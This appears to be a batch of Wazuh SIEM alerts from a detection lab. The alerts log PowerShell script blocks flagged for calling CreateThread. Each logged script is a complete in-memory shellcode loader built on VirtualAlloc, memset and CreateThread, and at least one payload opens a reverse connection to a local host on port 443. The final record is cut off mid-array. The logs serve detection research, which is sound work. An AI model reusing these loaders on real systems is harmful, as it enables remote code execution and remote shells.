{"timestamp":"2026-07-06T02:21:44.967+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":194,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304504.4038800","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:04.8318051Z","eventRecordID":"145810","processID":"2824","threadID":"8956","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 4cdc68da-b023-42f5-9ad2-5cdc1603a575\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"4cdc68da-b023-42f5-9ad2-5cdc1603a575"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:45.019+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":195,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304505.4050316","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:04.9222854Z","eventRecordID":"145812","processID":"8484","threadID":"1104","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$0iVu = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0iVu -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcb,0xba,0x14,0x05,0x01,0x6b,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0xe8,0xe7,0xf4,0x97,0xf8,0x6a,0xf6,0x67,0xf8,0x0a,0x7e,0x82,0xc9,0x0a,0xe4,0xc6,0x79,0xbb,0x6e,0x8a,0x75,0x30,0x22,0x3f,0x0e,0x34,0xeb,0x30,0xa7,0xf3,0xcd,0x7f,0x38,0xaf,0x2e,0xe1,0xba,0xb2,0x62,0xc1,0x83,0x7c,0x77,0x00,0xc4,0x61,0x7a,0x50,0x9d,0xee,0x29,0x45,0xaa,0xbb,0xf1,0xee,0xe0,0x2a,0x72,0x12,0xb0,0x4d,0x53,0x85,0xcb,0x17,0x73,0x27,0x18,0x2c,0x3a,0x3f,0x7d,0x09,0xf4,0xb4,0xb5,0xe5,0x07,0x1d,0x84,0x06,0xab,0x60,0x29,0xf5,0xb5,0xa5,0x8d,0xe6,0xc3,0xdf,0xee,0x9b,0xd3,0x1b,0x8d,0x47,0x51,0xb8,0x35,0x03,0xc1,0x64,0xc4,0xc0,0x94,0xef,0xca,0xad,0xd3,0xa8,0xce,0x30,0x37,0xc3,0xea,0xb9,0xb6,0x04,0x7b,0xf9,0x9c,0x80,0x20,0x59,0xbc,0x91,0x8c,0x0c,0xc1,0xc2,0x6f,0xf0,0x67,0x88,0x9d,0xe5,0x15,0xd3,0xc9,0xca,0x17,0xec,0x09,0x45,0x2f,0x9f,0x3b,0xca,0x9b,0x37,0x77,0x83,0x05,0xcf,0x78,0xbe,0xf2,0x5f,0x87,0x41,0x03,0x49,0x43,0x15,0x53,0xe1,0x62,0x16,0x38,0xf1,0x8b,0xc3,0xd5,0xf4,0x1b,0x2c,0x81,0xf6,0xff,0xc4,0xd0,0xf8,0xfa,0x2d,0x5c,0x1e,0x54,0x1e,0x0e,0x8f,0x14,0xce,0xee,0x7f,0xfc,0x04,0xe1,0xa0,0x1c,0x27,0x2b,0xc9,0xb6,0xc8,0x82,0xa1,0x2e,0x70,0x8f,0x3a,0xcf,0x7d,0x05,0x47,0xcf,0xf6,0xaa,0xb7,0x81,0xfe,0xc7,0xab,0x75,0x0f,0x92,0x96,0xd3,0x10,0x08,0xbc,0xdb,0x84,0xb7,0x17,0x8c,0x30,0xba,0x4e,0xfa,0x9e,0x45,0xa5,0x71,0x16,0xd0,0x06,0xed,0x57,0x34,0x87,0xed,0x01,0x5e,0x87,0x85,0xf5,0x3a,0xd4,0xb0,0xf9,0x96,0x48,0x69,0x6c,0x19,0x39,0xde,0x27,0x71,0xc7,0x39,0x0f,0xde,0x38,0x6c,0x91,0x22,0xef,0x48,0xe7,0x4a,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Sae=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Sae.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Sae,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 6fe3e001-91a3-43d6-9bf1-a9cb5719c8b0\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3945.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$0iVu = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0iVu -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcb,0xba,0x14,0x05,0x01,0x6b,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0xe8,0xe7,0xf4,0x97,0xf8,0x6a,0xf6,0x67,0xf8,0x0a,0x7e,0x82,0xc9,0x0a,0xe4,0xc6,0x79,0xbb,0x6e,0x8a,0x75,0x30,0x22,0x3f,0x0e,0x34,0xeb,0x30,0xa7,0xf3,0xcd,0x7f,0x38,0xaf,0x2e,0xe1,0xba,0xb2,0x62,0xc1,0x83,0x7c,0x77,0x00,0xc4,0x61,0x7a,0x50,0x9d,0xee,0x29,0x45,0xaa,0xbb,0xf1,0xee,0xe0,0x2a,0x72,0x12,0xb0,0x4d,0x53,0x85,0xcb,0x17,0x73,0x27,0x18,0x2c,0x3a,0x3f,0x7d,0x09,0xf4,0xb4,0xb5,0xe5,0x07,0x1d,0x84,0x06,0xab,0x60,0x29,0xf5,0xb5,0xa5,0x8d,0xe6,0xc3,0xdf,0xee,0x9b,0xd3,0x1b,0x8d,0x47,0x51,0xb8,0x35,0x03,0xc1,0x64,0xc4,0xc0,0x94,0xef,0xca,0xad,0xd3,0xa8,0xce,0x30,0x37,0xc3,0xea,0xb9,0xb6,0x04,0x7b,0xf9,0x9c,0x80,0x20,0x59,0xbc,0x91,0x8c,0x0c,0xc1,0xc2,0x6f,0xf0,0x67,0x88,0x9d,0xe5,0x15,0xd3,0xc9,0xca,0x17,0xec,0x09,0x45,0x2f,0x9f,0x3b,0xca,0x9b,0x37,0x77,0x83,0x05,0xcf,0x78,0xbe,0xf2,0x5f,0x87,0x41,0x03,0x49,0x43,0x15,0x53,0xe1,0x62,0x16,0x38,0xf1,0x8b,0xc3,0xd5,0xf4,0x1b,0x2c,0x81,0xf6,0xff,0xc4,0xd0,0xf8,0xfa,0x2d,0x5c,0x1e,0x54,0x1e,0x0e,0x8f,0x14,0xce,0xee,0x7f,0xfc,0x04,0xe1,0xa0,0x1c,0x27,0x2b,0xc9,0xb6,0xc8,0x82,0xa1,0x2e,0x70,0x8f,0x3a,0xcf,0x7d,0x05,0x47,0xcf,0xf6,0xaa,0xb7,0x81,0xfe,0xc7,0xab,0x75,0x0f,0x92,0x96,0xd3,0x10,0x08,0xbc,0xdb,0x84,0xb7,0x17,0x8c,0x30,0xba,0x4e,0xfa,0x9e,0x45,0xa5,0x71,0x16,0xd0,0x06,0xed,0x57,0x34,0x87,0xed,0x01,0x5e,0x87,0x85,0xf5,0x3a,0xd4,0xb0,0xf9,0x96,0x48,0x69,0x6c,0x19,0x39,0xde,0x27,0x71,0xc7,0x39,0x0f,0xde,0x38,0x6c,0x91,0x22,0xef,0x48,0xe7,0x4a,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Sae=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Sae.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Sae,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"6fe3e001-91a3-43d6-9bf1-a9cb5719c8b0","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3945.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:46.106+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":196,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304506.4061673","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:06.4955484Z","eventRecordID":"145820","processID":"4016","threadID":"6384","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$JT0t = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JT0t -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x82,0x4f,0x0c,0xc5,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xc2,0x04,0x03,0x5a,0x8d,0xad,0xf9,0x39,0x79,0xb3,0x02,0xc2,0x79,0xd4,0x8b,0x27,0x48,0xd4,0xe8,0x2c,0xfa,0xe4,0x7b,0x60,0xf6,0x8f,0x2e,0x91,0x8d,0xe2,0xe6,0x96,0x26,0x48,0xd1,0x99,0xb7,0xe1,0x21,0xbb,0x3b,0xf8,0x75,0x1b,0x02,0x33,0x88,0x5a,0x43,0x2e,0x61,0x0e,0x1c,0x24,0xd4,0xbf,0x29,0x70,0xe5,0x34,0x61,0x94,0x6d,0xa8,0x31,0x97,0x5c,0x7f,0x4a,0xce,0x7e,0x81,0x9f,0x7a,0x37,0x99,0xfc,0x47,0x81,0x12,0x36,0x33,0x10,0xf3,0x07,0xbc,0xbf,0x3a,0xa8,0x4f,0xc1,0x7b,0x0e,0xb0,0xb4,0x75,0x6d,0x4d,0xcf,0x41,0x0c,0x89,0x5a,0x52,0xb6,0x5a,0xfc,0xbe,0x47,0x8e,0x9b,0x35,0x4b,0x7b,0xef,0x12,0x4f,0x7a,0x3c,0x29,0x6b,0xf7,0xc3,0xfe,0xfa,0x43,0xe0,0xda,0xa7,0x10,0x89,0x7b,0x0d,0xf6,0xb6,0x9c,0xee,0xa7,0x12,0xd6,0x02,0xb3,0x2e,0xb5,0x4a,0x70,0x03,0x46,0x8a,0x1e,0x14,0x35,0xb8,0x81,0x8e,0xd1,0xf0,0x4a,0x09,0x25,0xf7,0x60,0xed,0xb9,0x06,0x8b,0x0e,0x93,0xcc,0xdf,0x5e,0x8b,0xe5,0x5f,0x35,0x4b,0x0a,0x8a,0xa0,0x4e,0x9c,0x84,0x89,0x5a,0x37,0x8f,0xf3,0x5c,0xd6,0x13,0x7d,0xba,0x88,0xfb,0x2d,0x13,0x68,0xac,0x8d,0xc3,0x00,0xa6,0x01,0x3b,0x30,0xc9,0xcb,0x54,0xda,0x26,0xa2,0x0d,0x72,0xde,0xef,0xc6,0xe3,0x1f,0x3a,0xa3,0x23,0xab,0xc9,0x53,0xed,0x5c,0xa7,0x47,0x99,0xac,0xf2,0x3a,0x0f,0xb2,0x28,0x50,0xaf,0x26,0xd7,0xf3,0xf8,0xde,0xd5,0x22,0xce,0x40,0x25,0x01,0x45,0x48,0xb3,0xea,0x31,0xb5,0x53,0xeb,0xc1,0xe3,0x39,0xeb,0xa9,0x53,0x1a,0xb8,0xcc,0x9b,0xb7,0xac,0x5d,0x0e,0x38,0x85,0x32,0x99,0x50,0x2b,0x6d,0xed,0xfe,0xd4,0x58,0xef,0xc3,0x02,0xa4,0x85,0x2d,0x97;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$GsSU=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($GsSU.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$GsSU,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: b4e1c859-7496-447e-aa9d-37a093b3bcb8\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3973.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$JT0t = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JT0t -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x82,0x4f,0x0c,0xc5,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x5a,0x13,0x83,0xc2,0x04,0x03,0x5a,0x8d,0xad,0xf9,0x39,0x79,0xb3,0x02,0xc2,0x79,0xd4,0x8b,0x27,0x48,0xd4,0xe8,0x2c,0xfa,0xe4,0x7b,0x60,0xf6,0x8f,0x2e,0x91,0x8d,0xe2,0xe6,0x96,0x26,0x48,0xd1,0x99,0xb7,0xe1,0x21,0xbb,0x3b,0xf8,0x75,0x1b,0x02,0x33,0x88,0x5a,0x43,0x2e,0x61,0x0e,0x1c,0x24,0xd4,0xbf,0x29,0x70,0xe5,0x34,0x61,0x94,0x6d,0xa8,0x31,0x97,0x5c,0x7f,0x4a,0xce,0x7e,0x81,0x9f,0x7a,0x37,0x99,0xfc,0x47,0x81,0x12,0x36,0x33,0x10,0xf3,0x07,0xbc,0xbf,0x3a,0xa8,0x4f,0xc1,0x7b,0x0e,0xb0,0xb4,0x75,0x6d,0x4d,0xcf,0x41,0x0c,0x89,0x5a,0x52,0xb6,0x5a,0xfc,0xbe,0x47,0x8e,0x9b,0x35,0x4b,0x7b,0xef,0x12,0x4f,0x7a,0x3c,0x29,0x6b,0xf7,0xc3,0xfe,0xfa,0x43,0xe0,0xda,0xa7,0x10,0x89,0x7b,0x0d,0xf6,0xb6,0x9c,0xee,0xa7,0x12,0xd6,0x02,0xb3,0x2e,0xb5,0x4a,0x70,0x03,0x46,0x8a,0x1e,0x14,0x35,0xb8,0x81,0x8e,0xd1,0xf0,0x4a,0x09,0x25,0xf7,0x60,0xed,0xb9,0x06,0x8b,0x0e,0x93,0xcc,0xdf,0x5e,0x8b,0xe5,0x5f,0x35,0x4b,0x0a,0x8a,0xa0,0x4e,0x9c,0x84,0x89,0x5a,0x37,0x8f,0xf3,0x5c,0xd6,0x13,0x7d,0xba,0x88,0xfb,0x2d,0x13,0x68,0xac,0x8d,0xc3,0x00,0xa6,0x01,0x3b,0x30,0xc9,0xcb,0x54,0xda,0x26,0xa2,0x0d,0x72,0xde,0xef,0xc6,0xe3,0x1f,0x3a,0xa3,0x23,0xab,0xc9,0x53,0xed,0x5c,0xa7,0x47,0x99,0xac,0xf2,0x3a,0x0f,0xb2,0x28,0x50,0xaf,0x26,0xd7,0xf3,0xf8,0xde,0xd5,0x22,0xce,0x40,0x25,0x01,0x45,0x48,0xb3,0xea,0x31,0xb5,0x53,0xeb,0xc1,0xe3,0x39,0xeb,0xa9,0x53,0x1a,0xb8,0xcc,0x9b,0xb7,0xac,0x5d,0x0e,0x38,0x85,0x32,0x99,0x50,0x2b,0x6d,0xed,0xfe,0xd4,0x58,0xef,0xc3,0x02,0xa4,0x85,0x2d,0x97;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$GsSU=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($GsSU.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$GsSU,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"b4e1c859-7496-447e-aa9d-37a093b3bcb8","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3973.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:47.575+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":197,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304507.4073042","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:07.3788909Z","eventRecordID":"145824","processID":"8988","threadID":"9128","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$gbE = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gbE -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdc,0xd9,0x74,0x24,0xf4,0xbb,0x6a,0xf6,0xab,0xef,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x5a,0x18,0x03,0x5a,0x18,0x83,0xc2,0x6e,0x14,0x5e,0x13,0x86,0x5a,0xa1,0xec,0x56,0x3b,0x2b,0x09,0x67,0x7b,0x4f,0x59,0xd7,0x4b,0x1b,0x0f,0xdb,0x20,0x49,0xa4,0x68,0x44,0x46,0xcb,0xd9,0xe3,0xb0,0xe2,0xda,0x58,0x80,0x65,0x58,0xa3,0xd5,0x45,0x61,0x6c,0x28,0x87,0xa6,0x91,0xc1,0xd5,0x7f,0xdd,0x74,0xca,0xf4,0xab,0x44,0x61,0x46,0x3d,0xcd,0x96,0x1e,0x3c,0xfc,0x08,0x15,0x67,0xde,0xab,0xfa,0x13,0x57,0xb4,0x1f,0x19,0x21,0x4f,0xeb,0xd5,0xb0,0x99,0x22,0x15,0x1e,0xe4,0x8b,0xe4,0x5e,0x20,0x2b,0x17,0x15,0x58,0x48,0xaa,0x2e,0x9f,0x33,0x70,0xba,0x04,0x93,0xf3,0x1c,0xe1,0x22,0xd7,0xfb,0x62,0x28,0x9c,0x88,0x2d,0x2c,0x23,0x5c,0x46,0x48,0xa8,0x63,0x89,0xd9,0xea,0x47,0x0d,0x82,0xa9,0xe6,0x14,0x6e,0x1f,0x16,0x46,0xd1,0xc0,0xb2,0x0c,0xff,0x15,0xcf,0x4e,0x97,0xda,0xe2,0x70,0x67,0x75,0x74,0x02,0x55,0xda,0x2e,0x8c,0xd5,0x93,0xe8,0x4b,0x1a,0x8e,0x4d,0xc3,0xe5,0x31,0xae,0xcd,0x21,0x65,0xfe,0x65,0x80,0x06,0x95,0x75,0x2d,0xd3,0x00,0x73,0xb9,0x1c,0x7c,0x7